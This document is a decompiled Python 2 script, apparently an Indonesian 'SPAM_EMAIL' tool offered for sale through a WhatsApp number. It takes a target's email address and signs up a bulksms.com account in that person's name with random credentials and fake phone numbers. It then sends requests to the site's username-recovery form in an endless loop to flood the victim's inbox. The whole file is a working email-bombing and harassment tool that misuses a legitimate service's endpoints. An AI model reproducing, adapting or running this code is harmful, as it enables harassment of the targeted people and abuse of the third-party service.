# uncompyle6 version 3.3.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Jun 19 2019, 07:40:37) 
# [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]
# Embedded file name: <seni>
import requests, sys, os, random
os.system('clear')
print "\n   \xe2\x95\xb2    \xe2\x95\xb1             \x1b[32;1m | S P A M _ E M A I L | \x1b[37;1m\n   \xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2        \x1b[33;1m| M R . B 4 1 2 ig:@fajar.agungn | \n\x1b[37;1m  \xe2\x94\x83\xe2\x94\x88\x1b[31;1m\xe2\x96\x87\x1b[37;1m\xe2\x94\x88\xe2\x94\x88\x1b[31;1m\xe2\x96\x87\x1b[37;1m\xe2\x94\x88\xe2\x94\x83     \x1b[36;1m  | Mau script ini?Wa 089637524919 | \x1b[37;1m\n\xe2\x95\xad\xe2\x95\xae\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab\xe2\x95\xad\xe2\x95\xae  \x1b[32;1m_____       _  _    \x1b[33;1m_____                  \n\x1b[37;1m\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\x1b[31;1m\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\x1b[37;1m\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83 \x1b[32;1m| __  | _ _ | || |_ \x1b[33;1m|   __| ___  ___  _____ \n\x1b[37;1m\xe2\x95\xb0\xe2\x95\xaf\xe2\x94\x83\x1b[31;1m\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\x1b[37;1m\xe2\x94\x83\xe2\x95\xb0\xe2\x95\xaf \x1b[32;1m| __ -|| | || || '_|\x1b[33;1m|__   || . || .'||     |\n\x1b[37;1m  \xe2\x95\xb0\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x95\xaf   \x1b[32;1m|_____||___||_||_,_|\x1b[33;1m|_____||  _||__,||_|_|_|\n\x1b[37;1m   \xe2\x95\xb0\xe2\x95\xaf  \xe2\x95\xb0\xe2\x95\xaf                              \x1b[33;1m |_|              \n"
print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]\x1b[33;1m===================================================\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
em = raw_input('\x1b[36;5m   Email Target: \x1b[32;5m')
print '\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]\x1b[33;1m===================================================\x1b[31;1m[\x1b[33;1m+\x1b[31;1m]'
print ''
wikwik = [
 '81243526382', '812346257388', '827362625362', '81243264625', '821364628482', '81249526782', '812346157388', '824362625362', '81243224625', '821364828482', '81243616178']

def kedua(email):
    global f
    f = 1
    while True:
        f += 1
        url2 = 'https://www2.bulksms.com/forgot_password/recover_usernames/'
        keyw = {'emailAddress': email}
        metod = requests.request('post', url2, data=keyw)
        if '{}' in metod.text:
            print '\x1b[31;5m[\x1b[33;5m' + str(f) + '\x1b[31;5m]\x1b[32;5m Berhasil Megirim \x1b[35;5m>> \x1b[37;5m' + em
        elif 'error' in metod.text:
            print '\x1b[31;5m[\x1b[33;5m' + str(f) + '\x1b[31;5m]\x1b[31;5m Gagal Mengirim \x1b[35;5m>> \x1b[37;5m' + em
            print metod.text
            print '\x1b[37;5mLimited/Error'
            print '[x] Keluar'
            sys.exit()


def Tod():
    print '\x1b[31;5m[\x1b[33;5m!\x1b[31;5m]\x1b[33;5m Mencoba Melakukan Registrasi......'
    c = 0
    non = random.choice(wikwik)
    uname = ('').join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(16))
    surname = ('').join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(6))
    gname = ('').join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for _ in range(6))
    fpass = ('').join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz12345678910') for _ in range(16))
    key = {'validate': 'true', 
       'username': uname, 
       'password': fpass, 
       'confirm_password': fpass, 
       'givenname': gname, 
       'surname': surname, 
       'email': em, 
       'msisdn_prefix': '62', 
       'msisdn': non, 
       'billing_country': 'ID', 
       'is_non_profit': '1', 
       'terms_and_conditions': '1', 
       'submit': 'Register', 
       'viewed_page_0': '1', 
       'current_page': '0', 
       'screen_id': '1545198865', 
       'vsmsid': '3'}
    url = 'https://www2.bulksms.com/register/'
    data = requests.request('post', url, data=key)
    c += 1
    if 'You have been successfully registered' in data.text:
        print '\x1b[31;5m[\x1b[33;5m' + str(c) + '\x1b[31;5m]\x1b[32;5m Berhasil Registrasi: \x1b[37;5m' + em
        print '\x1b[31;5m[\x1b[33;5m!\x1b[31;5m]\x1b[33;5m Mencoba Melakukan Lupa Password......'
        kedua(em)
    else:
        print '\x1b[31;5m[\x1b[33;5m' + str(c) + '\x1b[31;5m]\x1b[31;5m Gagal Registrasi \x1b[37;5m' + em
        print '\x1b[31;5m[\x1b[33;5mF\x1b[31;5m]\x1b[33;5m Maaf, Tunggu Beberapa Jam/Menit lagi!'
        sys.exit()


if __name__ == '__main__':
    Tod()